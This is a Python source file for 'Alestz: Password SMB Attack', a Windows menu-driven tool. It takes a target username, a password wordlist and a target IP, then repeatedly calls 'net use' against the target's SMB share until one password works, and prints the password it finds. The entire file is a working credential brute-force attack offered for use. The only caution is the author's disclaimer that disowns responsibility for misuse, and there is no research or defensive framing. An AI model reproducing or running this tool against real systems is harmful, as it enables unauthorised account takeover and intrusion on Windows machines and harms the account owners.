# Author: MemeCoder
# Platform: Windows
import os
import re
import socket
import subprocess
try:
    def pause(msg="Press Enter to continue..."):
        try:
            input(msg)
        except KeyboardInterrupt:
            pass
    if not os.name == 'nt':
        print("\033[91mThis tool is for Windows only.\033[0m")
        pause(msg="Press Enter to exit...")
        os.system("clear")
        exit(1)
    os.system("title Alestz: Password SMB Attack")
    def check_network():
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except OSError:
            return False
    def check_ip(ipV4):
        pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
        if re.match(pattern, ipV4):
            blocks = ipV4.split('.')
            if all(0 <= int(block) <= 255 for block in blocks):
                return True
        return False
    def cls():
        os.system('cls')
    def menu():
        cls()
        print("╔════════════════════╗")
        print("║  COMMANDS:         ║")
        print("║  \033[96m1\033[0m. \033[91mAttack\033[0m         ║")
        print("║  \033[96m2\033[0m. \033[92mInfo\033[0m           ║")
        print("║  \033[96m3\033[0m. \033[94mExit\033[0m           ║")
        print("╚════════════════════╝")
    def prompt_input(prompt):
        try:
            return input(prompt + " >> ").strip()
        except KeyboardInterrupt:
            print("\n\n\033[91mKeyboard interrupt!\033[0m")
            pause()
            return None
    def attack(user, wordlist, ip):
        if not check_network():
            print("\n\033[91mNo network connection!\033[0m")
            pause()
            return
        count = 1
        try:
            with open(wordlist, 'r', encoding='utf-8') as file:
                passwords = file.readlines()
        except FileNotFoundError:
            print("\n\033[91mFile does not exist!\033[0m")
            pause()
            return
        for passw in passwords:
            passw = passw.strip()
            if passw:
                try: 
                    result = subprocess.run(
                        ["net", "use", f"\\\\{ip}", "/user:" + user, passw],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    print(f"\033[93m[Attempt {count}]\033[0m\033[97m: {passw}\033[0m")
                    count += 1
                    if result.returncode == 0:
                        print(f"\n\033[92mPassword found\033[0m\033[97m: {passw}\033[0m")
                        subprocess.run(["net", "use", f"\\\\{ip}", "/d", "/y"], capture_output=True, text=True)
                        pause()
                        return
                except subprocess.TimeoutExpired:
                    print("\033[91mConnection timed out.\033[0m")
                    pause()
                    return
                except subprocess.SubprocessError as e:
                    print(f"\033[91mError during execution: {e}\033[0m")
                    pause()
                    return
                except KeyboardInterrupt:
                    print("\n\n\033[91mKeyboard interrupt!\033[0m")
                    pause()
                    return
                except Exception as e:
                    print(f"\n\033[91mAn error occurred: {e}\033[0m")
                    pause()
                    return
        print("\n\033[91mOh no, password not found =(\033[0m")
        pause()
        return
    def main():
        while True:
            menu()
            choice = prompt_input("")
            if choice is None:
                continue
            elif choice == '1':
                cls()
                print("\033[91mNOTE: I'm not responsible for the bad behavior you have caused. Thanks you!\033[0m")
                pause()
                cls()
                user = prompt_input("[TARGET USER]\n")
                if user == "":
                    print("\n\033[91mPlease enter a username!\033[0m")
                    pause()
                    continue
                elif user is None:
                    continue
                wordlist = prompt_input("\n[PASSWORD LIST]\n")
                if wordlist == "":
                    print("\n\033[91mPlease enter a password list!\033[0m")
                    pause()
                    continue
                elif wordlist is None:
                    continue
                ip = prompt_input("\n[TARGET IP]\n")
                if not check_ip(ip):
                    print("\n\033[91mInvalid IP address!\033[0m")
                    pause()
                    continue
                elif ip is None:
                    continue
                cls()
                attack(user, wordlist, ip)
            elif choice == '2':
                cls()
                print("\033[34m                 █████╗ ██╗     ███████╗███████╗████████╗███████╗  \033[0m")
                print("\033[94m                ██╔══██╗██║     ██╔════╝██╔════╝╚══██╔══╝╚══███╔╝  \033[0m")
                print("\033[96m                ███████║██║     █████╗  ███████╗   ██║     ███╔╝   \033[0m")
                print("\033[95m                ██╔══██║██║     ██╔══╝  ╚════██║   ██║    ███╔╝    \033[0m")
                print("\033[35m                ██║  ██║███████╗███████╗███████║   ██║   ███████╗  \033[0m")
                print("\033[35m                ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝   ╚══════╝  \033[0m")
                print("╔════════════════════════════════════════════════════════════════════════════════╗")
                print("║                          Alestz: Password SMB ATTACK                           ║")
                print("║                              Author:  MemeCoder                                ║")
                print("║                                 Version: 3.2                                   ║")
                print("╚════════════════════════════════════════════════════════════════════════════════╝")
                print("\033[92mThank you for using my tool!!!\033[0m")
                pause()
            elif choice == '3':
                cls()
                print("\033[94mBye...\033[0m")
                pause(msg="Press Enter to exit...")
                cls()
                exit(0)
            else:
                print("\n\033[91mInvalid choice!\033[0m")
                pause()
    if __name__ == "__main__":
            main()
except Exception as e:
    print(f"\n\033[91mAn error occurred: {e}\033[0m")
    pause("Press Enter to exit...")
    cls()
    exit(1)
